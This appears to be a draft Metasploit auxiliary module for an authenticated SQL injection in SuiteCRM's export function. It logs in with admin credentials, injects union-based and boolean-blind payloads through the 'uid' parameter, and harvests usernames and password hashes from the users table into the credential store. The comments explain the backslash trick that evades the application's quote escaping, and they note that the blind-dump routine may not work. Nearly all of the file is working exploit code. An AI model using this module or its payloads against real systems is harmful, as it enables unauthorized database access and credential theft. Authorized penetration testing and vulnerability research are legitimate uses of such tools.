##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

    include Msf::Auxiliary::Scanner
    include Msf::Exploit::SQLi
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::SQLi::BooleanBasedBlindMixin


    def initialize(info = {})
      super(
        update_info(
          info,
          'Name' => 'SuiteCRM authenticated SQL injection in export functionality',
          'Description' => %q{ },
          'Author' => [
            'Exodus Intelligence', # Advisory
            'jheysel-r7', # poc + msf module
          ],
          'License' => MSF_LICENSE,
          'References' => [
            ['URL', 'https://blog.exodusintel.com/2022/06/09/salesagility-suitecrm-export-request-sql-injection-vulnerability/']
          ],
          #TODO - update actions
          #
          'Actions' => [
            ['Dump tables', { 'Description' => 'Dumps database tables' }]
          ],
          'DefaultAction' => 'Dump tables',
          'DisclosureDate' => '2022-07-27',
          'Notes' => {
            'Stability' => [CRASH_SAFE],
            'SideEffects' => [IOC_IN_LOGS]
          },
          'Privileged' => true,
        )
      )
      register_options [
                         OptInt.new('COUNT', [false, 'Number of users to enumerate', 3]),
                         OptString.new('USERNAME', [true, 'Username of user with administrative rights', 'admin']),
                         OptString.new('PASS', [true, 'Password for administrator', 'admin']),
                       ]
  end

  def authenticate
    print_status("Authenticating as #{datastore['USERNAME']}")
    initial_req = send_request_cgi(
      {
        'method' => 'GET',
        'uri' => normalize_uri(target_uri, 'index.php'),
        'keep_cookies' => true,
        'vars_get' => {
          'module' => 'Users',
          'action' => 'Login'
        }
      }
    )

    return false unless initial_req && initial_req.code == 200

    login = send_request_cgi(
      {
        'method' => 'POST',
        'uri' => normalize_uri(target_uri, 'index.php'),
        'keep_cookies' => true,
        'vars_post' => {
          'module' => 'Users',
          'action' => 'Authenticate',
          'return_module' => 'Users',
          'return_action' => 'Login',
          'user_name' => datastore['USERNAME'],
          'username_password' => datastore['PASS'],
          'Login' => 'Log In'
        }
      }
    )

    return false unless login && login.code == 302

    res = send_request_cgi(
      {
        'method' => 'GET',
        'uri' => normalize_uri(target_uri, 'index.php'),
        'keep_cookies' => true,
        'vars_get' => {
          'module' => 'Administration',
          'action' => 'index'
        }
      }
    )

    auth_succeeded?(res)
  end

  def auth_succeeded?(res)
    return false unless res

    if res.code == 200
      print_good("Authenticated as: #{datastore['USERNAME']}")
      if res.body.include?('Unauthorized access to administration.')
        print_warning("#{datastore['USERNAME']} does not have administrative rights! Exploit will fail.")
        @is_admin = false
      else
        print_good("#{datastore['USERNAME']} has administrative rights.")
        @is_admin = true
      end
      @authenticated = true
      true
    else
      print_error("Failed to authenticate as: #{datastore['USERNAME']}")
      false
    end
  end

  def union_based_injection
    res = send_request_cgi({
                             'method' => 'POST',
                             'keep_cookies' => true,
                             'uri' => normalize_uri(target_uri.path, 'index.php?entryPoint=export'),
                             'encode_params' => false,
                             'vars_post' => {
                               'uid' => "\\,))+UNION+select+*+from+users;+--+&module=Accounts",
                               'module' => "Accounts",
                               'action' => "index"
                             },
                           })

    table = Rex::Text::Table.new('Header' => 'Users', 'Indent' => 1, 'Columns' => 'users')

    res.body.each_line do |user|
      username =  user.match(/"([\w\s]+)",/)
      next if username[1] == "Name"
      # binding.pry
      create_credential({
                          workspace_id: myworkspace_id,
                          origin_type: :service,
                          module_fullname: fullname,
                          username:  username[1],
                          service_name: 'SuiteCRM',
                          address: datastore['RHOSTS'],
                          port: datastore['RPORT'],
                          protocol: 'tcp',
                          status: Metasploit::Model::Login::Status::UNTRIED
                        })
      # table.add_row(['users', username[1]])
      print_good("Found user: #{username[1]}")

    end

    # print_good(table.to_s)

  end

  def dump_table_fields
    @sqli = create_sqli(dbms: MySQLi::BooleanBasedBlind, opts: { hex_encode_strings: true }) do |payload|
      res = send_request_cgi({
                               'method' => 'POST',
                               'keep_cookies' => true,
                               'uri' => normalize_uri(target_uri.path, 'index.php?entryPoint=export'),
                               'encode_params' => false,
                               'vars_post' => {
                                 'uid' => "ad71889b-7922-cb54-124b-62bcc053419d,\\,))+AND+#{payload};+--+",
                                 'module' => "Accounts",
                                 'action' => "index"
                               },
                             })
      # Every payload contains either a quote or a comma which doesn't work for this
      fail_with Failure::Unreachable, 'Connection failed' unless res
      res
    end

    unless @sqli.test_vulnerable
      print_bad("#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay.")
      return
    end
    print_good('Testing of SQLi passed. Target appears to be vulnerable')
    columns = %w[users user_hash]

    print_status('Enumerating Usernames and Password Hashes')
    data = @sqli.dump_table_fields('users', columns, '', datastore['COUNT'])

    table = Rex::Text::Table.new('Header' => 'users', 'Indent' => 1, 'Columns' => columns)

    data.each do |user|
      create_credential({
                          workspace_id: myworkspace_id,
                          origin_type: :service,
                          module_fullname: fullname,
                          username: user[0],
                          private_type: :nonreplayable_hash,
                          jtr_format: identify_hash(user[1]),
                          private_data: user[1],
                          service_name: 'SuiteCRM',
                          address: ip,
                          port: datastore['RPORT'],
                          protocol: 'tcp',
                          status: Metasploit::Model::Login::Status::UNTRIED
                        })
      table << user
    end

    # Currently the dump_table_fields method will always fail. I'm not sure there's a way to make it work due to the way
    # comma's are handled in the back end. I've included the code in case I'm overlooking something:
    # The vulnerable parameter "UID" is subject to the following character substitution:
    #     static $xss_cleanup = [
    #         '&quot;' => '&#38;',
    #         '"' => '&quot;',
    #         "'" => '&#039;',
    #         '<' => '&lt;',
    #         '>' => '&gt;',
    #         '`' => '&#96;'
    #
    # Comma's in the vulnerable "UID" parameter get surrounded in quotes by the following vulnerable code:
    #     if ($records) {
    #         $records = explode(',', $records);
    #         $records = "'" . implode("','", $records) . "'";
    #
    # Note backslashes do not get filtered out by $xss_cleanup which allows us to send: \,))+AND+#{payload};+--+
    # The backslash escapes it's closing single quote, the comma then surrounds the ))+AND+#{payload};+--+ in quotes,
    # the opening quote then closes the previous quote and we are then able to injection SQL code with limited characters.
    if table.rows.empty?
      print_bad("The dump_tables_fields method was unsuccessful")
    else
      print_good(table.to_s)
    end
  end

  def run_host(ip)
    authenticate unless @authenticated
    fail_with Failure::NoAccess, 'Unable to authenticate to SuiteCRM' unless @authenticated
    dump_table_fields
    union_based_injection
  end
end
